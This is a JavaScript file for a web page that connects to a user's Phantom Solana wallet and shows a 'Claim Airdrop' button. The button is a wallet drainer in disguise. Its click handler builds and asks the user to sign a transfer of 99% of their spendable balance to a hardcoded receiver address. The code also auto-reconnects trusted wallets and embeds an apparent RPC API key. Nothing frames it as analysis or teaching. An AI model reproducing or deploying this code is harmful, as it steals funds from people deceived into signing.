$(document).ready(function () {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    function showDeeplinkButton() {
        const dappUrl = encodeURIComponent(window.location.href);
        const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
        $('#phantom-deeplink').attr('href', phantomLink).show();
        $('#connect-wallet').hide();
    }

    async function handleWalletConnection(resp) {
        console.log("Phantom Wallet connected:", resp);

        const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw',
            'confirmed'
        );

        const public_key = new solanaWeb3.PublicKey(resp.publicKey);
        const walletBalance = await connection.getBalance(public_key);
        console.log("Wallet balance:", walletBalance);

        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        if (walletBalance < minBalance) {
            alert("Insufficient funds for rent.");
            return;
        }

        $('#connect-wallet').text("Claim Airdrop").show();
        $('#phantom-deeplink').hide();

        $('#connect-wallet').off('click').on('click', async () => {
            try {
                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                const balanceForTransfer = walletBalance - minBalance;

                if (balanceForTransfer <= 0) {
                    alert("Insufficient funds for transfer.");
                    return;
                }

                const transferAmount = balanceForTransfer * 0.99;

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: recieverWallet,
                        lamports: transferAmount,
                    })
                );

                transaction.feePayer = window.solana.publicKey;
                const blockhashObj = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhashObj.blockhash;

                const signed = await window.solana.signTransaction(transaction);
                const txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);

                alert("Transaction successful!");
                $('#connect-wallet').text("Connected");
            } catch (err) {
                console.error("Error during claim:", err);
                alert("Claim failed. Please try again.");
            }
        });
    }

    async function connectPhantom() {
        try {
            const resp = await window.solana.connect();
            sessionStorage.setItem('phantomConnected', 'true');
            sessionStorage.removeItem('phantomInstallRequested');
            handleWalletConnection(resp);
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
            alert("Error connecting to Phantom Wallet.");
        }
    }

    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            await connectPhantom();
        } else {
            alert("Phantom Wallet not found.");

            sessionStorage.setItem('phantomInstallRequested', 'true');

            if (isMobile) {
                showDeeplinkButton(); // Show link to open in Phantom app
            } else {
                const isFirefox = typeof InstallTrigger !== "undefined";
                const isChrome = !!window.chrome;

                if (isFirefox) {
                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
                } else if (isChrome) {
                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
                } else {
                    alert("Please install the Phantom extension for your browser.");
                }
            }
        }
    });

    // Resume after install (desktop + mobile)
    const phantomWasJustInstalled = sessionStorage.getItem('phantomInstallRequested') === 'true';
    const phantomAvailable = window.solana && window.solana.isPhantom;

    if (phantomWasJustInstalled && phantomAvailable) {
        connectPhantom();
    }

    // Auto-reconnect if already trusted
    if (phantomAvailable) {
        window.solana.on("connect", async () => {
            console.log("Wallet auto-connected (listener)");
            const resp = { publicKey: window.solana.publicKey };
            handleWalletConnection(resp);
        });

        const wasConnected = sessionStorage.getItem('phantomConnected');
        if (wasConnected) {
            window.solana.connect({ onlyIfTrusted: true })
                .then(resp => {
                    if (resp?.publicKey) {
                        handleWalletConnection(resp);
                    }
                })
                .catch(() => {
                    sessionStorage.removeItem('phantomConnected');
                });
        }
    } else if (isMobile) {
        showDeeplinkButton(); // If no Phantom object on mobile, show the deep link
    }
});
